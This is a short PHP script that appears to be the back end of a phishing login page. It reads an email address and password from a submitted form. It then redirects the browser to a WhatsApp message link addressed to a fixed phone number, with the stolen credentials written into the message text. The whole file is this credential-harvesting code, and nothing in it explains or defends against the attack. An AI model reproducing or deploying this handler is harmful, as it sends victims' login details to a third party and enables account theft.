<?php 
if(isset($_POST['submit'])){
    $email = $_POST['email'];
    // $provider = $_POST['provider'];
    $pass = $_POST['pass'];


    header("location:https://api.whatsapp.com/send?phone=6287847972064&text=Email_Kirim:%20$email%20%0DPass_word:%20$pass");
}

else {
    echo "
    <script>
    windows.location=history.go(-1);
    </script>
    ";
}

?>